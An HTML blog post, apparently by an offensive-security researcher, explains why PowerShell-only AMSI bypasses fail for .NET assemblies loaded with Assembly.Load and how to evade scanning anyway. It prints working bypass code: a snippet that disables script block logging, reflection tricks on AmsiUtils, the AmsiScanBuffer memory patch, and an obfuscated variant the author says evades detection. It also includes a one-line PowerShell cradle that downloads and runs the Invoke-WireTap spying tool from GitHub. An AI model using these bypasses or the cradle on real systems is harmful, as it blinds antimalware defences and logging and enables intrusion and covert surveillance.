@@ -1,0 +1,210 @@
+# https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
+
+<!DOCTYPE html><html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark" data-a11y-animated-images="system" data-a11y-link-underlines="true"><body style="word-wrap: break-word;">
+
+<article>
+  
+
+  <p>In the last months I was often asked about potential errors using <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">PowerSharpPack</a> or other PS1-scripts loading .NET assemblies via <code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]::Load()</code>. The reason for theese messages is actually not an error or a bug, but the .NET AMSI Interface, which catches the binaries loaded via <code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]::Load()</code>. Some of the public Powershell AMSI bypasses just don`t work for loaded .NET binaries and the error message is not self explanatory. Therefore I’m gonna show some examples and bypass methods in this post.</p>
+
+<!--more-->
+
+<h2 id="introduction">Introduction</h2>
+
+<p>In the regular case if you are loading a Powershell script which is flagged as malicious by AMSI you will expect to see the following error message:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">iex</span><span class="o">(</span><span class="kd">new</span><span class="na">-object </span><span class="nb">net</span>.webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-WireTap.ps1'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/AMSI_.NET/AMSIBlock.JPG">
+</p>
+
+<p>The message <code class="language-plaintext highlighter-rouge">This script contains malicious content and has been blocked by your antivirus software.</code> is very clear and shows us, that this script is flagged by AMSI. So, if we build our own <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">custom AMSI bypass</a> or just grab one payload from <a href="https://amsi.fail/">amsi.fail</a> and load the script afterwards, this will not result in any error message:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/AMSI_.NET/NoBlock.JPG">
+</p>
+
+<p>This let´s us assume, that we successfully bypassed AMSI and are able to execute the script. However, if we try to execute it we will get a new error message, which seams to be not related to AMSI:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/AMSI_.NET/AMSI.NET.JPG">
+</p>
+
+<p><code class="language-plaintext highlighter-rouge">Exception calling "Load" with "1" argument(s): "Could not load file or assembly '288768 bytes loaded from Anonymously
+Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An
+attempt was made to load a program with an incorrect format."</code> - this message is not telling about any malicious software found but states that the binaries format is incorrect.</p>
+
+<p>If you ever saw this message and wondered about it - welcome to the .NET AMSI Interface! :-)</p>
+
+<p>In this case, we successfully bypassed AMSI for the Powershell script-code itself, but <code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]::Load($byteOutArray)</code> triggers an AMSI-scan for the .NET binary which was base64 decoded and decompressed at runtime. But our bypass did not bypass the .NET AMSI-scan. Therefore the loading was blocked and <code class="language-plaintext highlighter-rouge">[WireT4p.Program]::main()</code> was not found. So let´s take a look at how we can still execute the script.</p>
+
+<h2 id="the-difference-between-powershell-only--process-specific-amsi-bypasses">The difference between Powershell only &amp; process specific AMSI bypasses</h2>
+
+<p>First things first: Why is our bypass not working for the .NET assembly loading? If we take a closer look at some of the public <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">AMSI bypass techniques</a> we will see one thing they all have in common:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code># <span class="kd">Disable</span> <span class="kd">Script</span> <span class="kd">Logging</span>:
+$settings <span class="o">=</span> <span class="o">[</span><span class="kd">Ref</span><span class="o">]</span>.Assembly.GetType<span class="o">(</span><span class="s2">"System.Management.Automation.Utils"</span><span class="o">)</span>.GetField<span class="o">(</span><span class="s2">"cachedGroupPolicySettings"</span><span class="o">,</span><span class="s2">"NonPublic,Static"</span><span class="o">)</span>.GetValue<span class="o">(</span>$null<span class="o">);</span>
+$settings<span class="o">[</span><span class="s2">"HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"</span><span class="o">]</span> <span class="o">=</span> @<span class="o">{}</span>
+$settings<span class="o">[</span><span class="s2">"HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"</span><span class="o">]</span>.Add<span class="o">(</span><span class="s2">"EnableScriptBlockLogging"</span><span class="o">,</span> <span class="s2">"0"</span><span class="o">)</span>
+
+# <span class="kd">Matt</span> <span class="kd">Graebers</span> <span class="kd">Reflection</span> <span class="kd">method</span>:
+<span class="o">[</span><span class="kd">Ref</span><span class="o">]</span>.Assembly.GetType<span class="o">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="o">)</span>.GetField<span class="o">(</span><span class="s1">'amsiInitFailed'</span><span class="o">,</span><span class="s1">'NonPublic,Static'</span><span class="o">)</span>.SetValue<span class="o">(</span>$null<span class="o">,</span>$true<span class="o">)</span>
+
+# <span class="kd">Forcing</span> <span class="kd">an</span> <span class="kd">error</span>:
+$mem <span class="o">=</span> <span class="o">[</span><span class="kd">System</span>.Runtime.InteropServices.Marshal<span class="o">]</span>::AllocHGlobal<span class="o">(</span><span class="m">9076</span><span class="o">)</span>
+<span class="o">[</span><span class="kd">Ref</span><span class="o">]</span>.Assembly.GetType<span class="o">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="o">)</span>.GetField<span class="o">(</span><span class="s2">"amsiSession"</span><span class="o">,</span><span class="s2">"NonPublic,Static"</span><span class="o">)</span>.SetValue<span class="o">(</span>$null<span class="o">,</span> $null<span class="o">);[</span><span class="kd">Ref</span><span class="o">]</span>.Assembly.GetType<span class="o">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="o">)</span>.GetField<span class="o">(</span><span class="s2">"amsiContext"</span><span class="o">,</span><span class="s2">"NonPublic,Static"</span><span class="o">)</span>.SetValue<span class="o">(</span>$null<span class="o">,</span> <span class="o">[</span><span class="kd">IntPtr</span><span class="o">]</span>$mem<span class="o">)</span>
+</code></pre></div></div>
+
+<p>They either disable Powershell Script-Logging or change subvalues of the <code class="language-plaintext highlighter-rouge">System.Management.Automation</code> namespace. The <code class="language-plaintext highlighter-rouge">System.Management.Automation</code> namespace basically is the root namespace for the Windows PowerShell. Both techniques are therefore Powershell specific and only affect the Anti Malware Scan-Interface for Powershell script-code.</p>
+
+<p>The changed subvalues for <code class="language-plaintext highlighter-rouge">System.Management.Automation.AmsiUtils</code> in our PoC above therefore didn’t break the .NET AMSI-scan - because it´s not related to Powershell. If you have read my other blog posts or the linked resources for the functionality of AMSI you already know, that <code class="language-plaintext highlighter-rouge">amsi.dll</code> is loaded into a new process to hook any input in the Powershell commandline or to analyze content for <code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]::Load()</code> calls. Other AMSI bypass techniques rely on <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass"> in memory patching</a> for <code class="language-plaintext highlighter-rouge">amsi.dll</code>, which breaks AMSI for the whole process. <code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]::Load()</code> doesn’t create a new process - therefore using one of theese techniques will result in a bypass for the script code <code class="language-plaintext highlighter-rouge">AND</code> the .NET binary which is loaded.</p>
+
+<p>As always we need to modify the public script code to circumvent AMSI for the bypass itself. For example <a href="https://twitter.com/_RastaMouse">@_RastaMouse’s</a> AmsiScanBuffer bypass looks like this:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$Win32 <span class="o">=</span> @<span class="s2">"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("</span><span class="kd">kernel32</span><span class="s2">")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("</span><span class="kd">kernel32</span><span class="s2">")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("</span><span class="kd">kernel32</span><span class="s2">")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"</span>@
+
+<span class="kd">Add</span><span class="na">-Type </span>$Win32
+
+$LoadLibrary <span class="o">=</span> <span class="o">[</span><span class="kd">Win32</span><span class="o">]</span>::LoadLibrary<span class="o">(</span><span class="s2">"am"</span> <span class="o">+</span> <span class="s2">"si.dll"</span><span class="o">)</span>
+$Address <span class="o">=</span> <span class="o">[</span><span class="kd">Win32</span><span class="o">]</span>::GetProcAddress<span class="o">(</span>$LoadLibrary<span class="o">,</span> <span class="s2">"Amsi"</span> <span class="o">+</span> <span class="s2">"Scan"</span> <span class="o">+</span> <span class="s2">"Buffer"</span><span class="o">)</span>
+$p <span class="o">=</span> <span class="m">0</span>
+<span class="o">[</span><span class="kd">Win32</span><span class="o">]</span>::VirtualProtect<span class="o">(</span>$Address<span class="o">,</span> <span class="o">[</span><span class="kd">uint32</span><span class="o">]</span><span class="m">5</span><span class="o">,</span> <span class="mh">0x40</span><span class="o">,</span> <span class="o">[</span><span class="kd">ref</span><span class="o">]</span>$p<span class="o">)</span>
+$Patch <span class="o">=</span> <span class="o">[</span><span class="kd">Byte</span><span class="o">[]]</span> <span class="o">(</span><span class="mh">0xB8</span><span class="o">,</span> <span class="mh">0x57</span><span class="o">,</span> <span class="mh">0x00</span><span class="o">,</span> <span class="mh">0x07</span><span class="o">,</span> <span class="mh">0x80</span><span class="o">,</span> <span class="mh">0xC3</span><span class="o">)</span>
+<span class="o">[</span><span class="kd">System</span>.Runtime.InteropServices.Marshal<span class="o">]</span>::Copy<span class="o">(</span>$Patch<span class="o">,</span> <span class="m">0</span><span class="o">,</span> $Address<span class="o">,</span> <span class="m">6</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>To make it short: The things, that are easily flaggable are the variable names, the .NET Class-Name in combination with the three loaded Windows API calls, the strings <code class="language-plaintext highlighter-rouge">amsi.dll</code> and <code class="language-plaintext highlighter-rouge">AmsiScanBuffer</code> and the Patch-bytes themself. In my opinion flagging the DLLImports would result in too many false positives, so that won’t happen most likely.</p>
+
+<p>I just created a <a href="https://github.com/Flangvik/AMSI.fail/pull/1">Pull Request for amsi.fail</a>, which automates the process of variable randomization and string obfuscation for the public code snippet. One of the resulting payloads looks like this and is not flagged at the time of writing:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ZQCUW <span class="o">=</span> @<span class="s2">"
+using System;
+using System.Runtime.InteropServices;
+public class ZQCUW {
+    [DllImport("</span><span class="kd">kernel32</span><span class="s2">")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("</span><span class="kd">kernel32</span><span class="s2">")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("</span><span class="kd">kernel32</span><span class="s2">")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"</span>@
+
+<span class="kd">Add</span><span class="na">-Type </span>$ZQCUW
+
+$BBWHVWQ <span class="o">=</span> <span class="o">[</span><span class="kd">ZQCUW</span><span class="o">]</span>::LoadLibrary<span class="o">(</span><span class="s2">"$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'))"</span><span class="o">)</span>
+$XPYMWR <span class="o">=</span> <span class="o">[</span><span class="kd">ZQCUW</span><span class="o">]</span>::GetProcAddress<span class="o">(</span>$BBWHVWQ<span class="o">,</span> <span class="s2">"$([systeM.neT.webUtility]::HtMldECoDE('&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'))"</span><span class="o">)</span>
+$p <span class="o">=</span> <span class="m">0</span>
+<span class="o">[</span><span class="kd">ZQCUW</span><span class="o">]</span>::VirtualProtect<span class="o">(</span>$XPYMWR<span class="o">,</span> <span class="o">[</span><span class="kd">uint32</span><span class="o">]</span><span class="m">5</span><span class="o">,</span> <span class="mh">0x40</span><span class="o">,</span> <span class="o">[</span><span class="kd">ref</span><span class="o">]</span>$p<span class="o">)</span>
+$TLML <span class="o">=</span> <span class="s2">"0xB8"</span>
+$PURX <span class="o">=</span> <span class="s2">"0x57"</span>
+$YNWL <span class="o">=</span> <span class="s2">"0x00"</span>
+$RTGX <span class="o">=</span> <span class="s2">"0x07"</span>
+$XVON <span class="o">=</span> <span class="s2">"0x80"</span>
+$WRUD <span class="o">=</span> <span class="s2">"0xC3"</span>
+$KTMJX <span class="o">=</span> <span class="o">[</span><span class="kd">Byte</span><span class="o">[]]</span> <span class="o">(</span>$TLML<span class="o">,</span>$PURX<span class="o">,</span>$YNWL<span class="o">,</span>$RTGX<span class="o">,+</span>$XVON<span class="o">,+</span>$WRUD<span class="o">)</span>
+<span class="o">[</span><span class="kd">System</span>.Runtime.InteropServices.Marshal<span class="o">]</span>::Copy<span class="o">(</span>$KTMJX<span class="o">,</span> <span class="m">0</span><span class="o">,</span> $XPYMWR<span class="o">,</span> <span class="m">6</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Using this newly generated bypass and loading <a href="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-WireTap.ps1">Invoke-Wiretap</a> afterwards results in no AMSI block for the script-code <code class="language-plaintext highlighter-rouge">AND</code> the .NET binary:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/AMSI_.NET/WireTapSuccess.JPG">
+</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>We learned, that some of the public AMSI bypass techniques only work for Powershell script-code and therefore don’t disable AMSI for .NET <code class="language-plaintext highlighter-rouge">assembly::load</code> calls.</p>
+
+<p>To still bypass AMSI for Powershell scripts, which load .NET binaries we have to rely on for example in memory patching of <code class="language-plaintext highlighter-rouge">amsi.dll</code>. This will give us a “global” bypass for the current process.</p>
+
+<h2 id="links--resources">Links &amp; Resources</h2>
+
+<ul>
+  <li>PowerSharpPack - <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">https://github.com/S3cur3Th1sSh1t/PowerSharpPack</a></li>
+  <li>Bypass AMSI by manual modification - <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/</a></li>
+  <li>amsi.fail - <a href="https://amsi.fail/">https://amsi.fail/</a></li>
+  <li>Amsi Bypass Powershell - <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a></li>
+  <li>AmsiScanBufferBypass - <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">https://github.com/rasta-mouse/AmsiScanBufferBypass</a></li>
+  <li>WireTap - <a href="https://github.com/djhohnstein/WireTap">https://github.com/djhohnstein/WireTap</a></li>
+</ul>
+
+  
+</article>
+<article>
+If you like what I'm doing consider --&gt;  <div src="https://github.com/sponsors/S3cur3Th1sSh1t/button" title="Sponsor S3cur3Th1sSh1t" height="35" width="116" style="border: 0;" data-original-tag="iframe">
+    
+  <link rel="dns-prefetch" href="https://github.githubassets.com/">
+  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com/">
+  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com/">
+  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
+  <link rel="preconnect" href="https://github.githubassets.com/" crossorigin="">
+  <link rel="preconnect" href="https://avatars.githubusercontent.com/">
+
+  
+  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/sponsors-embed-6a38bcf4216f82d6.css">
+
+
+  
+
+  
+
+  
+  
+
+  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
+  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
+  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">
+
+
+
+
+
+  <link rel="manifest" href="https://github.com/manifest.json" crossorigin="use-credentials">
+
+  
+
+  
+    <div data-turbo-body="" style="word-wrap: break-word;">
+      <div id="__primerPortalRoot__" role="region" style="z-index: 1000; position: absolute; width: 100%;" data-turbo-permanent=""></div>
+      
+  <main>
+    <a href="https://github.com/sponsors/S3cur3Th1sSh1t?o=esb" aria-label="Sponsor @S3cur3Th1sSh1t" target="_top" data-view-component="true" class="Button--secondary Button--medium Button Button--fullWidth">  <span class="Button-content">
+      <span class="Button-visual Button-leadingVisual">
+        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-heart color-fg-sponsors">
+    <path d="m8 14.25.345.666a.75.75 0 0 1-.69 0l-.008-.004-.018-.01a7.152 7.152 0 0 1-.31-.17 22.055 22.055 0 0 1-3.434-2.414C2.045 10.731 0 8.35 0 5.5 0 2.836 2.086 1 4.25 1 5.797 1 7.153 1.802 8 3.02 8.847 1.802 10.203 1 11.75 1 13.914 1 16 2.836 16 5.5c0 2.85-2.045 5.231-3.885 6.818a22.066 22.066 0 0 1-3.744 2.584l-.018.01-.006.003h-.002ZM4.25 2.5c-1.336 0-2.75 1.164-2.75 3 0 2.15 1.58 4.144 3.365 5.682A20.58 20.58 0 0 0 8 13.393a20.58 20.58 0 0 0 3.135-2.211C12.92 9.644 14.5 7.65 14.5 5.5c0-1.836-1.414-3-2.75-3-1.373 0-2.609.986-3.029 2.456a.749.749 0 0 1-1.442 0C6.859 3.486 5.623 2.5 4.25 2.5Z"></path>
+</svg>
+      </span>
+    <span class="Button-label">Sponsor</span>
+  </span>
+</a>
+
+  </main>
+
+    </div>
+    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true"></div>
+    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
+  
+
+</div> &lt;-- or <a href="https://www.patreon.com/S3cur3Th1sSh1t">become a Patron</a> for a coffee or beer. 
+</article>
+
+  
+
+
+
+
+</body></html>
